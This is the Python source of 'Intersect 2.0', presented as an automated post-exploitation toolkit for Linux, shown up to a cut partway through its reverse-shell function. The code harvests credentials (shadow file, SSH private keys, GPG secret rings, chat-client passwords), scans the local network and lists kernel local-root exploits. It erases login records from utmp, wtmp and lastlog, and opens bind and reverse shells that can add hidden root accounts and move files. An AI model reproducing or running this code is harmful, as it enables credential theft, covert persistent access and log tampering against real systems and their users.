#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# email: bindshell[at]live[dot]com
# twitter: @ohdae
# http://github.com/ohdae/Intersect-2.0/ || http://bindshell.it.cx/
#
# To see the full description of Intersect 2.0, view the attached ReadMe file.
# The ToDo-List will be updated frequently to show changes, upcoming features, bug fixes, etc.
#
# If you find any bugs or have any suggestions or comments, please contact the developer!
#
#-------------------------------------------------------------------------------------------------
#   Copyright (C) 2012  ohdae | bindshell@live.com
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#--------------------------------------------------------------------------------------------------

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import operator
import SocketServer, SimpleHTTPServer
from math import log

cut = lambda s: str(s).split("\0",1)[0]

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("The Python module Scapy is not installed. You must have this to use the --live-hosts option.")
        print("Scapy can be downloaded from: https://www.secdev.org/projects/scapy/\n")

def usage():
    
    __version__ = "revision 2.2.1"
    __author__ = "ohdae"
    __website__ = "http://bindshell.it.cx"
   
    print("=====================================================")                                                                    
    print("       intersect 2.0 | automated post-exploitation")
    print("                "+__version__+"                ")
    print("               "+__author__+" | "+__website__)
    print("=====================================================")
    print("\nFeatures:")
    print("  -d --daemon         run Intersect as a background process")
    print("  -o --os-info        os/distro, users, devices, cronjobs, installed apps, etc")
    print("  -n --network        detailed network info")
    print("  -l --live-hosts     find live hosts on network")
    print("  -c --credentials    locate and save user/system credentials")
    print("  -e --extras         locate installed AV/FW, configs and extras")
    print("  -a --all-tests      run all local tests and tar reports *scapy required")
    print("  -t --tar            make archive of final reports")
    print("  -s --scrub          scrubs current user/ip from utmp, wtmp & lastlog")
    print("  -b --bind           opens bindshell on port 443")
    print("  -r --reverse        opens reverse shell *change RHOST in config")  
    print("  -h --help           prints this menu")
    print("usage: ./intersect.py --daemon --network --extras")
    print("       ./intersect.py --all-tests\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global RHOST
    global RPORT
    global pkey
    global distro
    global distro2
    global HPORT

    RHOST = '127.0.0.1' # Remote host used in reverse shell
    RPORT = 443         # Remote port used in reverse shell
    pkey = 'XKIUKX'     # XOR Key for shell cipher
    HPORT = 8080

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    if os.geteuid() != 0:
        print("[*] This script *must* be executed as root. If not, there will be errors and/or crashes.")
        print("[*] Intersect will now check this kernel for possible privilege escalation exploits.\n")
        exploitCheck()
        sys.exit()
    else:
         pass

    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"
   

    signal.signal(signal.SIGINT, signalHandler)
    
    # Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"
   
    os.system("clear")

    print("[+] Creating temporary working environment....")
    os.chdir(Home_Dir)
    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)
    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir

  
def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)


def Gather_OS():
    print("[+] Collecting operating system and user information....")
    os.mkdir(Temp_Dir+"/osinfo/")
    os.chdir(Temp_Dir+"/osinfo/")
   
    proc = Popen('ps aux',
                 shell=True, 
                 stdout=PIPE,
                 )
    output = proc.communicate()[0]
    file = open("ps_aux.txt","a")
    for items in output:
        file.write(items),
    file.close()

    os.system("ls -alh /usr/bin > bin.txt")
    os.system("ls -alh /usr/sbin > sbin.txt")
    os.system("ls -al /etc/cron* > cronjobs.txt")
    os.system("ls -alhtr /media > media.txt")

    if distro == "ubuntu" or distro2 == "Ubuntu":
        os.system("dpkg -l > dpkg_list.txt")
    elif distro == "arch" or distro2 == "Arch":
        os.system("pacman -Q > pacman_list.txt")
    elif distro == "slackware" or distro2 == "Slackware":
        os.system("ls /var/log/packages > packages_list.txt")
    elif distro == "gentoo" or distro2 == "Gentoo":
        os.system("cat /var/lib/portage/world > packages.txt")
    elif distro == "centos" or distro2 == "CentOS":
        os.system("yum list installed > yum_list.txt")
    elif distro == "red hat" or distro2 == "Red Hat":
        os.system("rpm -qa > rpm_list.txt")
    else:
       pass
   
    if distro == "arch":
        os.system("egrep '^DAEMONS' /etc/rc.conf > services_list.txt")
    elif distro == "slackware":
        os.system("ls -F /etc/rc.d | grep \'*$\' > services_list.txt")
    elif whereis('chkconfig') is not None:
        os.system("chkconfig -A > services_list.txt")

    os.system("mount -l > mount.txt")
    os.system("cat /etc/sysctl.conf > sysctl.txt")
    os.system("find /var/log -type f -exec ls -la {} \; > loglist.txt")
    os.system("uname -a > distro_kernel.txt")
    os.system("df -hT > filesystem.txt")
    os.system("free -lt > memory.txt")
    os.system("locate sql | grep [.]sql$ > SQL_locations.txt")
    os.system("find /home -type f -iname '.*history' > HistoryList.txt")
    os.system("cat /proc/cpuinfo > cpuinfo.txt")
    os.system("cat /proc/meminfo > meminfo.txt")

    if os.path.exists(Home_Dir+"/.bash_history") is True:
        shutil.copy2(Home_Dir+"/.bash_history", "bash_history.txt")
    if os.path.exists(Home_Dir+"/.viminfo") is True:
        shutil.copy2(Home_Dir+"/.viminfo", "viminfo")
    if os.path.exists(Home_Dir+"/.mysql_history") is True:
        shutil.copy2(Home_Dir+"/.mysql_history", "mysql_history")
   
    sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
    content = ''
    for f in sysfiles:
        content = content + '\n' + open(f).read()
    open('SysInfo.txt','wb').write(content)
    os.system("rm distro_kernel.txt filesystem.txt memory.txt cpuinfo.txt meminfo.txt")
   
    os.mkdir("users/")
    os.chdir("users/")
   
    os.system("ls -alhR ~/ > CurrentUser.txt")
    os.system("ls -alhR /home > AllUsers.txt")
    if os.path.exists(Home_Dir+"/.mozilla/") is True:
        os.system("find "+Home_Dir+"/.mozilla -name bookmarks*.json > UsersBookmarks.txt")

   
def GetCredentials():
    print("[+] Collecting user and system credentials....")
    os.mkdir(Temp_Dir+"/credentials")
    os.chdir(Temp_Dir+"/credentials/")
    
    os.system('getent passwd > passwd.txt')
    os.system('getent shadow > shadow.txt')
    os.system("lastlog > lastlog.txt")
    os.system("last -a > last.txt")
    os.system("getent aliases > mail_aliases.txt")

    
    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
    os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
    content = ''
    for f in sshfiles:
       content = content + '\n' + open(f).read()
    open('SSH_Locations.txt','wb').write(content)
    os.system("rm ssh_locations.txt ssh_contents.txt")
    if os.path.exists(Home_Dir+"/.bash_history") is True:
        os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")


    credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
                    Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
                    Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
    for x in credentials:
    	if os.path.exists(x) is True:
    		shutil.copy2(x, Temp_Dir+"/credentials/")

    users = []
    passwd = open('/etc/passwd')
    for line in passwd:
        fields = line.split(':')
        uid = int(fields[2])
        if uid > 500 and uid < 32328:
             users.append(fields[0])
    if whereis('pidgin') is not None:
        for user in users:
            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
                accts = open("/home/"+user+"/.purple/accounts.xml")
                saved = open("Pidgin.txt", "a")
                for line in accts.readlines():
                    if '<protocol>' in line:
                        saved.write(line)
                    elif '<name>' in line:
                        saved.write(line)
                    elif '<password>' in line:
                        saved.write(line)
                    else:
                        pass
                    
                accts.close()
                saved.close()

    for user in users:
        if os.path.exists("/home/"+user+"/.irssi/config") is True:
            accts = open("/home/"+user+"/.irssi/config")
            saved = open("irssi.txt", "a")
            for line in accts.readlines():
                if "password = " in line:
                    saved.write(line)
                else:
                    pass
            accts.close()
            saved.close()

    for user in users:
        if os.path.exists("/home/"+user+"/.znc/configs/znc.conf") is True:
            shutil.copy2("/home/"+user+"/.znc/configs/znc.conf", "znc.conf")
        else:
            pass           
            

def NetworkInfo():
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    os.mkdir(Temp_Dir+"/network")
    networkdir = (Temp_Dir+"/network")
    os.chdir(networkdir) 

    proc = Popen('netstat --tcp --listening',
         shell=True,
         stdout=PIPE,
         )
    output = proc.communicate()[0]

    file = open("nstat.txt","a")
    for items in output:
        file.write(items),
    file.close() 

    os.system("lsof -nPi > lsof.txt")
    ports = ["nstat.txt","lsof.txt"]
    content = ''
    for f in ports:
        content = content + '\n' + open(f).read()
    open('Connections.txt','wb').write(content)
    os.system("rm nstat.txt lsof.txt")
    if whereis('iptables') is not None:
        os.system("iptables -L -n > iptablesLN.txt") 
        os.system("iptables-save > iptables_save.txt")
    else:
        pass

    os.system("ifconfig -a > ifconfig.txt")


    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
        os.system("hostname -I > IPAddresses.txt")
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
        splitIP = localIP.split('.')
        splitIP[3:] = (['0/24'])
        IPRange = ".".join(splitIP)
        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
        file = open("IPAddresses.txt", "a")
        file.write("External IP Address: " + externalIP)
        file.write("Internal IP Address: " + localIP)
        file.write("Internal IP Range: " + IPRange)
        file.close
   
    os.system("hostname -f > hostname.txt")
   
    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
    content = ''
    for f in netfiles:
        content = content + '\n' + open(f).read()
    open('NetworkInfo.txt','wb').write(content)
    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")

    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
    for x in network:
        if os.path.exists(x) is True:
            shutil.copy2(x, networkdir)
   
               
def NetworkMap():
    # Combine ARP then portscan. Send IPs to list and iterate through for the scan
    # Add service identification via socket for all open ports
    # Add traceroute after finding live hosts. Send all results to graph report.
   
    print("[+] Searching for live hosts...")
    os.mkdir(Temp_Dir+"/hosts")
    os.chdir(Temp_Dir+"/hosts")

    try:
        #TODO:Consider scanning all non-loopback addresses for multi-homed machines
        localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
    except OSError:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
    else:
        pass
    #Get the integer representation of the local IP address
    ipBin = reduce(lambda x, y: (int(x) << 8)+int(y), localIP.split('.'))
    #route = [ network_addr, netmask, gateway, interface, address ]
    for route in scapy.all.conf.route.routes:
        if (route[4] == localIP #If it's the address we're talking to
            and route[0] != 0 #and it's not the route to the gateway itself
            and route[0] == (route[1] & ipBin)): #And localIP is in this subnet (fixes 169.254/16 oddness)
                #Calculate the CIDR from the base-2 logarithm of the netmask
                IPRange = '/'.join((localIP, str(int(32-log(0xffffffff-route[1]+1,2)))))
    
    conf.verb=0
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IPRange),timeout=2)
    file = open("livehosts.txt", "a")
    file.write("LAN IP Range: " + IPRange +"\n")
    for snd,rcv in ans:
        mac_address=rcv.sprintf("%Ether.src%")
        ip_address=rcv.sprintf("%ARP.psrc%")
        #print rcv.sprintf("\n\n[+] Live Host\nMAC %Ether.src%\nIP: %ARP.psrc%\n ")
        file.write("\n[+] Live Host\nIP: "+ip_address + " MAC"+ mac_address + "\n")
    file.write("\n")
    file.close

    externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
    file = open("external.txt", "a")
    file.write("External IP Address: " + externalIP +"\n")
    file.write("Internal IP Address: " + localIP +"\n")
    file.write("Internal IP Range: " + IPRange +"\n")
    file.close
    
 
def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
       if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None

    
def FindExtras():
    os.mkdir(Temp_Dir+"/extras")
    protectiondir = (Temp_Dir+"/extras")
    os.chdir(protectiondir)
    os.mkdir(Config_Dir)


    configs = [ "/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf",
                "/etc/bitlbee/bitlbee.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf",
                "/etc/security/access.conf", "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/apt/secring.gpg",
                "/etc/apt/trusted.gpg", "/etc/nginx/nginx.conf", "/etc/shells", "/etc/gated.conf", "/etc/inetd.conf", "/etc/rpc",
                "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf"
                "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/ldap.conf", "/opt/lampp/etc/httpd.conf", "/etc/cups/cups.conf",
                "/etc/exports", "/etc/fstab", "~/.msf4/history", "/etc/ssl/openssl.cnf" ]


    for x in configs:
        if os.path.exists(x) is True:
            shutil.copy2(x, Temp_Dir+"/configs/")

    print("[+] Searching for protection and misc extras....")
    program = [ "truecrypt", "bulldog", "ufw", "iptables", "logrotate", "logwatch", 
                "chkrootkit", "clamav", "snort", "tiger", "firestarter", "avast", "lynis",
                "rkhunter", "perl", "tcpdump", "nc", "webmin", "python", "gcc", "jailkit", 
                "pwgen", "proxychains", "bastille", "wireshark", "nagios", "nmap", "firefox",
                "nagios", "tor", "openvpn", "virtualbox", "magictree", "apparmor", "git",
                "xen", "svn", "redmine", "ldap", "msfconsole" ]

    for x in program:
        location = whereis(x)
        if location is not None:
            file = open("FullList.txt","a")
            content = location + '\n'
            file.write(content)
            file.close()

    if whereis('git') is not None:
	os.system("find ~/ /home -name *.git > GitRepos.txt")
        proc = Popen('cat /home/*/.gitconfig',
               shell=True,
               stdout=PIPE,
               )
        output = proc.communicate()[0]
	file = open("GitRepos.txt","a")
        file.write(output),
        file.close()

    #if whereis('svn') is not None:
        #os.system("find / -name *.svn > SvnRepos.txt")
               
    if os.path.exists("~/.msf4/") is True:
        os.system("ls -l ~/.msf/loot > MetasploitLoot.txt")


def ScrubLog():  
    try:
      Current_User = os.getlogin()
    except OSError:
      print "[!] Cannot find user in logs. Did you all ready run --scrub ?"
      return
    
    newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
    writeNewFile(UTMP_FILEPATH, newUtmp)
    print "[+] %s cleaned" % UTMP_FILEPATH
	  
    newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
    writeNewFile(WTMP_FILEPATH, newWtmp)
    print "[+] %s cleaned" % WTMP_FILEPATH

    newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
    writeNewFile(LASTLOG_FILEPATH, newLastlog)
    print "[+] %s cleaned" % LASTLOG_FILEPATH


def scrubFile(filePath, Current_User):
    newUtmp = ""
    with open(filePath, "rb") as f:
      bytes = f.read(UTMP_STRUCT_SIZE)
      while bytes != "":
        data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
        if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
	  newUtmp += bytes
        bytes = f.read(UTMP_STRUCT_SIZE)
    f.close()
    return newUtmp


def scrubLastlogFile(filePath, Current_User):
    pw  	     = pwd.getpwnam(Current_User)
    uid	       = pw.pw_uid
    idCount    = 0
    newLastlog = ''
  
    with open(filePath, "rb") as f:
      bytes = f.read(LASTLOG_STRUCT_SIZE)
      while bytes != "":
        data = struct.unpack("hh32s256s", bytes)
        if (idCount != uid):
	  newLastlog += bytes
        idCount += 1
        bytes = f.read(LASTLOG_STRUCT_SIZE)
    return newLastlog


def writeNewFile(filePath, fileContents):
    f = open(filePath, "w+b")
    f.write(fileContents)
    f.close()
  

def fix_version(version):
    split_version = version.split(".")

    if len(split_version) >= 3 and len(split_version[2]) == 1:
        split_version[2] = "0%s" % split_version[2]
        version = ".".join(v for v in split_version)

    return version

class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.copyfile(urllib2.urlopen(self.path), self.wfile)

def exploitCheck():
    # Shout out to Bernardo Damele for letting me use this code! Thanks again!
    # Check out his blog at http://bernardodamele.blogspot.com

    kernel_version_string = os.popen('uname -r').read().strip()

    exploitdb_url = "http://www.exploit-db.com/exploits"
    enlightenment_url = "http://www.grsecurity.net/~spender/enlightenment.tgz"
    
    print "[+] Results for local kernel version %s" % kernel_version_string

    kernel_parts = kernel_version_string.split("-")
    kernel_version = fix_version(kernel_parts[0])

    found_exploit = False
    exploits = {
                 "do_brk": { "CVE": "2003-0961", "versions": ("2.4.0-2.4.22",), "exploits": (131,) },
                 "mremap missing do_munmap": { "CVE": "2004-0077", "versions": ("2.2.0-2.2.25", "2.4.0-2.4.24", "2.6.0-2.6.2"), "exploits": (160,) },
                 "binfmt_elf Executable File Read": { "CVE": "2004-1073", "versions": ("2.4.0-2.4.27", "2.6.0-2.6.8"), "exploits": (624,) },
                 "uselib()": { "CVE": "2004-1235", "versions": ("2.4.0-2.4.29rc2", "2.6.0-2.6.10rc2"), "exploits": (895,) },
                 "bluez": { "CVE": "2005-1294", "versions": ("2.6.0-2.6.11.5",), "exploits": (4756, 926) },
                 "prctl()": { "CVE": "2006-2451", "versions": ("2.6.13-2.6.17.4",), "exploits": (2031, 2006, 2011, 2005, 2004) }, 
                 "proc": { "CVE": "2006-3626", "versions": ("2.6.0-2.6.17.4",), "exploits": (2013,) },
                 "system call emulation": { "CVE": "2007-4573", "versions": ("2.4.0-2.4.30", "2.6.0-2.6.22.7",), "exploits": (4460,) },
                 "vmsplice": { "CVE": "2008-0009", "versions": ("2.6.17-2.6.24.1",), "exploits": (5092, 5093) },
                 "ftruncate()/open()": { "CVE": "2008-4210", "versions": ("2.6.0-2.6.22",), "exploits": (6851,) },
                 "eCryptfs (Paokara)": { "CVE": "2009-0269", "versions": ("2.6.19-2.6.31.1",), "exploits": (enlightenment_url,) },
                 "set_selection() UTF-8 Off By One": { "CVE": "2009-1046", "versions": ("2.6.0-2.6.28.3",), "exploits": (9083,) },
                 "UDEV < 141": { "CVE": "2009-1185", "versions": ("2.6.25-2.6.30",), "exploits": (8478, 8572) },
                 "exit_notify()": { "CVE": "2009-1337", "versions": ("2.6.0-2.6.29",), "exploits": (8369,) },
                 "ptrace_attach() Local Root Race Condition": { "CVE": "2009-1527", "versions": ("2.6.29",), "exploits": (8678, 8673) },
                 "sock_sendpage() (Wunderbar Emporium)": { "CVE": "2009-2692", "versions": ("2.6.0-2.6.31rc3", "2.4.0-2.4.37.1"), "exploits": (9641, 9545, 9479, 9436, 9435, enlightenment_url) },
                 "udp_sendmsg() (The Rebel)": { "CVE": "2009-2698", "versions": ("2.6.0-2.6.9.2",), "exploits": (9575, 9574, enlightenment_url) },
                 "(32bit) ip_append_data() ring0": { "CVE": "2009-2698", "versions": ("2.6.0-2.6.9",), "exploits": (9542,) },
                 "perf_counter_open() (Powerglove and Ingo m0wnar)": { "CVE": "2009-3234", "versions": ("2.6.31",), "exploits": (enlightenment_url,) },
                 "pipe.c (MooseCox)": { "CVE": "2009-3547", "versions": ("2.6.0-2.6.32rc5", "2.4.0-2.4.37"), "exploits": (10018, enlightenment_url) },
                 "CPL 0": { "CVE": "2010-0298", "versions": ("2.6.0-2.6.11",), "exploits": (1397,) },
                 "ReiserFS xattr": { "CVE": "2010-1146", "versions": ("2.6.0-2.6.34rc3",), "exploits": (12130,) },
                 "Unknown": { "CVE": None, "versions": ("2.6.18-2.6.20",), "exploits": (10613,) },
                 "SELinux/RHEL5 (Cheddar Bay)": { "CVE": None, "versions": ("2.6.9-2.6.30",), "exploits": (9208, 9191, enlightenment_url) },
                 "compat": { "CVE": "2010-3301", "versions": ("2.6.27-2.6.36rc4",), "exploits": (15023, 15024) },
                 "BCM": { "CVE": "2010-2959", "versions": ("2.6.0-2.6.36rc1",), "exploits": (14814,) },
                 "RDS protocol": { "CVE": "2010-3904", "versions": ("2.6.0-2.6.36rc8",), "exploits": (15285,) },
                 "put_user() - full-nelson": { "CVE": "2010-4258", "versions": ("2.6.0-2.6.37",), "exploits": (15704,) },
                 "sock_no_sendpage() - full-nelson": { "CVE": "2010-3849", "versions": ("2.6.0-2.6.37",), "exploits": (15704,) },
                 "ACPI custom_method": { "CVE": "2010-4347", "versions": ("2.6.0-2.6.37rc2",), "exploits": (15774,) },
                 "CAP_SYS_ADMIN": { "CVE": "2010-4347", "versions": ("2.6.34-2.6.37",), "exploits": (15916, 15944) },
                 "econet_sendmsg() - half-nelson": { "CVE": "2010-3848", "versions": ("2.6.0-2.6.36.2",), "exploits": (17787,) },
                 "ec_dev_ioctl() - half-nelson": { "CVE": "2010-3850", "versions": ("2.6.0-2.6.36.2",), "exploits": (17787, 15704) },
                 "ipc - half-nelson": { "CVE": "2010-4073", "versions": ("2.6.0-2.6.37rc1",), "exploits": (17787,) },
               }

    print "\nPossible exploits:"

    for name, data in exploits.items():
        versions = data["versions"] 

        for version_tree in versions:
            if "-" in version_tree:
                min_version, max_version = version_tree.split("-")
            else:
                min_version, max_version = version_tree, version_tree

            if kernel_version >= fix_version(min_version) and kernel_version <= fix_version(max_version):
                cve = data["CVE"]
                exploits = data["exploits"]
                found_exploit = True

                print "\n* Linux Kernel %s Local Root Exploit\n    CVE: CVE-%s\n    Affected Kernels: %s-%s\n    Exploits:\n%s" % (name, cve, min_version, max_version, "\n".join("      %s/%d" % (exploitdb_url, expl) if isinstance(expl, int) else "      %s" % expl for expl in exploits))

    if found_exploit:
        print

        if len(kernel_parts) > 1:
            print "WARNING: %s appears to be a modified version of kernel %s." % (kernel_version_string, kernel_version)
            print "These exploits can *possibly* get you to uid=0, but this script does *not* consider patched or backported kernel version\n"


def bindShell():
    HOST = ''
    PORT = 443
    socksize = 4096
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        print "[+] Shell bound on 443"
        conn, addr = server.accept()
        print "[+] New Connection: %s" % addr[0]
        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
    except:
        print "[!] Connection closed."
    	sys.exit(2)
    
    while True:
        cmd = conn.recv(socksize)
        proc = Popen(cmd,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()
        if cmd.startswith('cd'):
	    destination = cmd[3:].replace('\n','')
            if os.path.isdir(destination):
	        os.chdir(destination)
	        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
            else:
	        conn.send("[!] Directory does not exist") 
	        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[+] Root account " + acct + " has been created.")
        elif cmd == ("httproxy"):
	    httpd = SocketServer.ForkingTCPServer(('', HPORT), Proxy)
            conn.send("[+] Serving HTTP proxy on port %s" % HPORT)
	    httpd.serve_forever()  
        elif cmd.startswith('upload'):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = conn.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send("[+] File upload complete!")
            if not os.path.isfile(filename):
                conn.send("[!] File upload failed! Please try again")
        elif cmd.startswith('download'):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                conn.sendall(filedata)
            else:
                conn.send("[+] File not found!")
        elif cmd.startswith("rebootsys"):
            conn.send("[!] Server system is going down for a reboot!")
            os.system("shutdown -h now")
        elif cmd == ("extask osinfo"):
            Gather_OS()
            conn.send("\n[+] OS Info Gathering complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask network"):
            NetworkInfo()
            conn.send("\n[+] Network Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask credentials"):
            GetCredentials()
            conn.send("\n[+] Credentials Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask livehosts"):
            NetworkMap()
            conn.send("\n[+] Network Map complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask findextras"):
            FindExtras()
            conn.send("\n[+] Extras Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask scrub"):
            ScrubLog()
            conn.send("\n[+] Scrubbing complete.")
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ('killme'):
            conn.send("[!] Shutting down shell!\n")
            conn.close()
            sys.exit(0)
        elif proc:
            conn.sendall( stdout )
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")


def reverseShell():
    #Change RHOST in environment() to your remote host
    socksize = 4096
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        conn.connect((RHOST, RPORT))
        conn.send("[+] New connection established!")
        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
    except:
        print("[!] Connection error!")
        sys.exit(2)

    while True:
        cmd = conn.recv(socksize)
        proc = Popen(cmd,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()
        if cmd.startswith('cd'):
	    destination = cmd[3:].replace('\n','')
            if os.path.isdir(destination):
	        os.chdir(destination)
	        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
            else:
	        conn.send("[!] Directory does not exist") 
	        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[+] Root account " + acct + " has been created.")
        elif cmd == ("httproxy"):
	    httpd = SocketServer.ForkingTCPServer(('', HPORT), Proxy)
            conn.send("[+] Serving HTTP proxy on port %s" % HPORT)
	    httpd.serve_forever()  
        elif cmd.startswith('upload'):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = conn.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send("[+] File upload complete!")
            if not os.path.isfile(filename):
                conn.send("[!] File upload failed! Please try again")
        elif cmd.startswith('download'):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                conn.sendall(filedata)
            else:
                conn.send("[+] File not found!")
        elif cmd.startswith("rebootsys"):
            conn.send("[!] Server system is going down for a reboot!")
            os.system("shutdown -h now")
        elif cmd == ("extask osinfo"):
            Gather_OS()
            conn.send("\n[+] OS Info Gathering complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask network"):
            NetworkInfo()
            conn.send("\n[+] Network Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask credentials"):
            GetCredentials()
            conn.send("\n[+] Credentials Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask livehosts"):
            NetworkMap()
            conn.send("\n[+] Network Map complete.")
